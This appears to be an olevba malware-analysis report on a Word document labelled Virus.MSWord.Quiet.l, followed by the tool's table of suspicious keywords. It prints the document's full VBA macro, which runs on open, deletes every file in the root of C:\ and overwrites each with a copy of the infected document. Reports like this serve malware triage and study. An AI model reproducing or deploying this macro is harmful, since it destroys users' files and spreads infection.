olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Quiet.l
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Quiet.l - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Sub CopyFileA Lib "kernel32" (ByVal src As String, ByVal dst As String, ByVal mode As Long)
Sub Document_Open()
On Error Resume Next
Set FS = Application.FileSearch
FS.NewSearch
FS.FileName = "*.*"
FS.LookIn = "C:\"
FS.SearchSubFolders = False
FS.Execute
For i = 1 To FS.FoundFiles.Count
If FS.FoundFiles(i) <> ActiveDocument.FullName Then
Kill FS.FoundFiles(i)
CopyFileA ActiveDocument.FullName, FS.FoundFiles(i), 0
End If
Next i
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Lib                 |May run code from a DLL                      |
+----------+--------------------+---------------------------------------------+

